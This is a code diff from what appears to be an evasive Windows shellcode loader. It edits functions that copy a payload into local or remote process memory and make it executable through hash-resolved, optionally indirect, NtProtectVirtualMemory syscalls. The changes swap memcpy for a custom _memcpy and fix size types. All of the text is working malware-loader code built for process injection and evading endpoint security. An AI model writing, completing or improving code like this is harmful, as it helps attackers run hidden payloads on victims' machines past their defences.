@@ -12,11 +12,11 @@ BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) 
 		return FALSE;
 	}
 
-	memcpy(*pAddress, pPayload, sPayloadSize);
+	_memcpy(*pAddress, pPayload, sPayloadSize);
 	DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);
 
 	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
-	if ((STATUS = pNtProtectVirtualMemory(GetCurrentProcess(), pAddress, (PULONG)&sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
+	if ((STATUS = pNtProtectVirtualMemory(GetCurrentProcess(), pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
 		DebugPrint("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		VirtualFree(*pAddress, 0, MEM_RELEASE);
 		return FALSE;
@@ -31,7 +31,7 @@ BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) 
     }
 
     // Copy the payload to the allocated memory
-    memcpy(*pAddress, pPayload, sPayloadSize);
+    _memcpy(*pAddress, pPayload, sPayloadSize);
     DebugPrint("[+] Payload written to memory at: 0x%p (%d bytes)\n", *pAddress, sPayloadSize);
 
     // Change memory protection to executable
@@ -47,7 +47,7 @@ BOOL WritePayloadInMemory(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) 
 }
 
 BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pAddress) {
-	ULONG	sNumberOfBytesWritten = 0;
+	SIZE_T	sNumberOfBytesWritten = 0;
 	DWORD	dwOldProtection = 0;
 
 #ifdef HW_INDIRECT_SYSCALL
@@ -68,7 +68,7 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
 	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
-	if ((STATUS = pNtProtectVirtualMemory(hProcess, pAddress, (PULONG)&sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
+	if ((STATUS = pNtProtectVirtualMemory(hProcess, pAddress, &sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) != 0) {
 		DebugPrint("\t[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
